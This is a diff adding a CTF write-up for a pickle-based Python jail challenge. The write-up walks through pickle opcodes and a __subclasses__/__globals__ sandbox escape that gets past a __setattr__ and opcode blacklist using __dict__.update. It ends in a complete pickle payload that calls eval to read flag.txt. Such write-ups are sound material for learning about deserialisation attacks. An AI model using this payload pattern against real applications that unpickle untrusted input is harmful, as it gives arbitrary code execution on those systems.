@@ -601,6 +601,327 @@ I would like to thank my team mate [t0m7r00z](https://github.com/t0m7r00z) for t
 
 3. <p name="jail3"><b>Kevin Higgs: The Revenge</b></p>
 
+    This one was one of my favorite challenges, we don't see much of this kind of challenges around. The goal of this challenge was to write an exploit with Pickle Opcode that respects a certain conditions.
+
+    Source: [Link](/2022/GDG%20Algiers/source/jail/Kevin%20Higgs%3A%20The%20Revenge/challenge/challenge.py)<br/>
+    Solve: [Link](/2022/GDG%20Algiers/source/jail/Kevin%20Higgs%3A%20The%20Revenge/challenge/solve.py)
+
+    This challenge is about writing a proper pickle OpCode to get a shell/get the content of "flag.txt".
+
+    As a start, what's pickle & what's an OpCode?
+
+    Pickle is a python module that helps in serializing python objects to be able to send the object across the network as a sequence of bytes or to be able to write an object into a file to save it.
+
+    What's the opcode? When you serialize an object, you serialize the functions defined in it too, which means, that code have to be saved somehow... That's what an opcode is for, it's like an assembly.
+
+    Alright, now, our challenge is a revenge version of [this challenge](https://ctftime.org/writeup/33666).
+
+    Checking the code:
+    * Payload length: 400
+    * We can access attributes of only `empty`
+    * We have a maximum depth of 2 (Example: empty.x.y)
+
+    Reading the writeup above, we should execute this:
+
+    `empty.__class__.__base__.__subclasses__()[100].__init__.__globals__['__builtins__']['eval']('print(open("flag.txt").read())')`
+
+    But we'll have to do that one step at a time due to the depth limit. We'll simply add more attributes to `empty` class to be able to solve that, like the following:
+
+    ```python
+    empty.x = empty.__class__.__base__
+    empty.y = empty.x.__subclasses__()[100]
+    empty.z = empty.y.__init__
+    ...
+    ```
+
+    The difference here is, we cannot use the `__setattr__` function because it's blacklisted. We'll have to figure an equivalent method.
+
+    There is also an opcode blacklist, we'll talk about that later on but it didn't matter a lot.
+
+    Now, how can we replace `__setattr__`? There are 2 ways for this, the intended solution was using `empty.__init__` function. The other way, which I used, was by using the `empty.__dict__.update` function.
+
+    If we examine the `__dict__` object, if we add a key to it we'll be able to add an attribute to our class.
+
+    <p align="center">
+        <img src="/2022/GDG%20Algiers/img/Kevin%20Higgs:%20The%20Revenge/dict.png"><br/>
+    </p>
+
+    Now, if we look up the functions we have in the `dict` object using `help`, we can find the `update` function:
+
+    <p align="center">
+        <img src="/2022/GDG%20Algiers/img/Kevin%20Higgs:%20The%20Revenge/update.png"><br/>
+    </p>
+
+    And it takes a **dict/iterable** and updates the dictionary from it. This looked like the best hope I had at that moment so I gave it a try.
+
+    Now, it's time to talk about opcodes. The execution makes use of 2 things:
+    * Stack: We can push & pop. Last in first out.
+    * Memo: Similar to an array, store/get elements by index.
+
+    And we have OpCode instructions that uses the stack values.
+
+    I had to go through everything to figure out what we had, if you're interested in reading more, you can check the [documentation](https://docs.juliahub.com/Pickle/LAUNc/0.3.2/opcode/#OpCodes).
+
+    I also used this code to print out the allowed opcodes:
+
+    ```python
+    import prettytable
+    import pickletools
+
+    BLACKLIST_OPCODES = {
+        "BUILD",
+        "SETITEM",
+        "SETITEMS",
+        "DICT",
+        "EMPTY_DICT",
+        "INST",
+        "OBJ",
+        "NEWOBJ",
+        "EXT1",
+        "EXT2",
+        "EXT4",
+        "EMPTY_SET",
+        "ADDITEMS",
+        "FROZENSET",
+        "NEWOBJ_EX",
+        "FRAME",
+        "BYTEARRAY8",
+        "NEXT_BUFFER",
+        "READONLY_BUFFER",
+    }
+
+    opcode_table = prettytable.PrettyTable()
+    opcode_table.field_names = ['Name', 'Code', 'Docs']
+    for opcode in pickletools.opcodes:
+        if opcode.name not in BLACKLIST_OPCODES:
+            opcode_table.add_row([opcode.name, hex(ord(opcode.code)), opcode.doc.splitlines()[0]])
+        
+    print(opcode_table)
+    ```
+
+    Reference: [Writeup](https://ctftime.org/writeup/29142)
+    
+    I'll go through the OpCodes that we'll use for now:
+
+    * **UNICODE** (0x56): Used to push a unicode string object to the stack.
+        Example: `Vempty` will push "empty" to the stack.
+
+    * **STACK_GLOBAL** (0x93) or **GLOBAL** (0x63): This takes 2 strings from the stack (\n is a seperator). Then calls `find_class` for us, which will resolve the string we pushed. The result will be pushed to stack.
+        Example: `Vempty\nV__class__.__base__\n\x93` will function the following way:
+        ```
+        Stack.push("empty")
+        Stack.push("__class__.__base__")
+
+        # STACK_GLOBAL opcode:
+        arg2 = Stack.pop()
+        arg1 = Stack.pop()
+        result = find_class(arg1, arg2)
+        Stack.push(result)
+        ```
+    
+    * **MARK** (0x28): Used to mark the begining of tuples, dicts, lists... while creating them.
+
+    * **TUPLE** (0x74): Creates a tuple, starting from the top of the stack, till it reaches a **MARK** object. Example:
+        ```
+        Stack:
+            a (TOP OF STACK)
+            b
+            c
+            MARK
+            d
+        
+        After TUPLE OpCode
+
+        Stack:
+            (c, b, a) (TOP OF STACK)
+            d
+        ```
+    
+    * **REDUCE** (0x52): Takes a tuple from the stack & a callable object (A function) & uses the tuple as arguments for the function call. We'll use this to call the `update` function. Example:
+        ```
+        Stack:
+            function_object
+            (a, b, c)
+        
+        args = Stack.pop()
+        func = Stack.pop()
+        Stack.push(func(*args))
+        ```
+    
+    * **PUT** (0x70): We give it an index & it'll store the top of the stack into the memo in that index.
+
+    * **GET** (0x67): We give it an index & it'll push the stored value from the memo in that index to the stack.
+
+    * **DUP** (0x32): Takes the value in the top of the stack & pushs it again to duplicate it.
+    
+    Now, how are we going to call `update`? If we look closely at the `BLACKLIST_OPCODES`, we'll find `DICT` opcode blacklisted which means we cannot create a `dict` in stack, what if we try passing a pair of `(KEY, VALUE)` ?
+
+    <p align="center">
+        <img src="/2022/GDG%20Algiers/img/Kevin%20Higgs:%20The%20Revenge/dict2.png"><br/>
+    </p>
+
+    We see that it asks for the element #0 to have a length of 2? One might think, We are already passing a tuple of length 2? What's going on? BUT, what if it's checking the element #0 of that tuple? If we try to make it of size 2: `(('K', 1), 2)`
+
+    <p align="center">
+        <img src="/2022/GDG%20Algiers/img/Kevin%20Higgs:%20The%20Revenge/dict3.png"><br/>
+    </p>
+
+    We can see that we've added a new key! Also we are getting the same error for the element #1 now. So if we use the following: `(('K', 1), ('K',2))`<br/>
+    We'll add a new key 'K' & the value will be set to 2.
+
+    <p align="center">
+        <img src="/2022/GDG%20Algiers/img/Kevin%20Higgs:%20The%20Revenge/dict4.png"><br/>
+    </p>
+
+    We can use this to add 2 keys at once too.
+
+    Now, how can we call `update` with opcodes? The tuples are a mess true but we can do it slowly:
+
+    ```
+    MARK
+    Stack.push("k")
+    Stack.push(2)
+
+    Stack:
+        2
+        k
+        MARK
+    ```
+
+    Now, if we add a TUPLE Opcode, we'll create a tuple in the stack:
+
+    ```
+    MARK
+    Stack.push("k")
+    Stack.push(2)
+    TUPLE
+
+    Stack:
+        (k, 2)
+    ```
+
+    Now, if we add an other **MARK** before everything, and duplicate our tuple, we'll have the following:
+
+    ```
+    MARK
+
+    MARK
+    Stack.push("k")
+    Stack.push(2)
+    TUPLE
+
+    DUP
+
+    Stack:
+        (k, 2)
+        (k, 2)
+        MARK
+    ```
+
+    We add a **TUPLE** to wrap everything:
+
+    ```
+    MARK
+
+    MARK
+    Stack.push("k")
+    Stack.push(2)
+    TUPLE
+
+    DUP
+    TUPLE
+
+    Stack:
+        ((k, 2), (k, 2))
+    ```
+
+    Now, this is the first argument to `update`, if we go back to **REDUCE**, we see that all of the arguments must be wrapped in a tuple, so we add a **MARK** at the begining & wrap everything with a tuple:
+
+    ```
+    MARK
+
+    MARK
+
+    MARK
+    Stack.push("k")
+    Stack.push(2)
+    TUPLE
+
+    DUP
+    TUPLE
+
+    TUPLE
+
+    Stack:
+        ( ((k, 2), (k, 2)) )
+    ```
+
+    And now, we are ready to call `update`, we only have to push the callable object (Not the string) `update`.
+
+    ```
+    Stack.push(update)
+
+    MARK
+    MARK
+    MARK
+    Stack.push("k")
+    Stack.push(2)
+    TUPLE
+    DUP
+    TUPLE
+    TUPLE
+
+    REDUCE
+    ```
+
+    And that'll execute `update( ((k, 2), (k, 2)) )` !
+
+    Now, how do we get the `update` object? We can use the **STACK_GLOBAL** opcode to resolve `"__dict__.update"` for us.
+
+    ```
+    Stack.push("empty")
+    Stack.push("__dict__.update")
+
+    STACK_GLOBAL
+
+    Stack:
+        update (callable object)
+    ```
+
+    Now, we can use the memo to make our payload shorter by saving the "empty" string. Also we'll store our `update` in it to make access easier.
+
+    Our final payload will be:
+
+    ```python
+    lepickle = b'\x80\x04' \
+           b'Vempty\np6\n' \
+           b'g6\nV__class__.__base__\n\x93p0\n' \
+           b'(g6\nV__dict__.update\n\x93p1\n' \
+           b'g1\n(((Vobj\ng0\nt\x32ttR' \
+           b'g6\nVobj.__getattribute__\n\x93p2\n' \
+           b'g1\n(((Vsc\ng6\nVobj.__subclasses__\n\x93)Rt\x32ttR' \
+           b'g6\nVsc.__getitem__\n\x93p3\n' \
+           b'g1\n(((Vi\ng2\n(g3\n(I100\ntRV__init__\ntRt\x32ttR' \
+           b'g1\n(((Vgl\ng6\nVi.__globals__\n\x93t\x32ttR' \
+           b'g6\nVgl.__getitem__\n\x93p4\n' \
+           b'g1\n(((Vb\ng4\n(V__builtins__\ntRt\x32ttR' \
+           b'g6\nVb.__getitem__\n\x93p5\n' \
+           b'g1\n(((Ve\ng5\n(Veval\ntRt\x32ttR' \
+           b'g6\nVe\n\x93(Vprint(open("flag.txt").read())\ntR.'
+    ```
+
+    I re-used the payload in this [writeup](https://ctftime.org/writeup/33666) & I edited the code to make it faster.
+
+    Too scary huh? Just look at each line on it's own:
+
+    * `'\x80\x04'`: Pickle protocol version
+    * `b'Vempty\np6\n'`: `Vempty\n` Push "empty". `p6\n` stores the top of the stack in memo[6].
+    * `'g6\nV__class__.__base__\n\x93p0\n'`: `g6\n` Push memo[6] in stack. `V__class__.__base__\n` push "\_\_class__.\_\_base__" in stack. `\x93` is **STACK_GLOBAL**. `p0\n` stores top of stack (result of `find_class`) in memo[0].
+
+    And so on...
+
+    That was all! This was fun, nice one!
+
 ------------
 
 WIP
